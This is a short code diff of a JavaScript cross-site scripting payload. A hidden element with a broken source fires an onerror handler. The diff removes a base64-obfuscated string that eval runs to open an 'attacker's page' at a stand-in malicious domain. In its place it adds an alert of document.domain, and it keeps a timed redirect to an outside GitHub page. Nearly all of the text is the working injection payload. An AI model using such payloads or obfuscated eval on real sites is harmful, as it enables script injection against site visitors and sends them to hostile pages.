@@ -14,8 +14,7 @@
             hiddenPayload.src = "x";
             hiddenPayload.style.display = "none";
             hiddenPayload.onerror = function() {
-                var payload = atob('KHdpbmRvdy5vcGVuKCdodHRwOi8veW91cm1hbGljaW91c2xpbmsuY29tJykp'); // Opens attacker's page
-                eval(payload);
+                alert(document.domain); // XSS popup
                 setTimeout(function() {
                     window.location.href = "https://github.com/Zierax";
                 }, 2000); // Redirect after 2 seconds
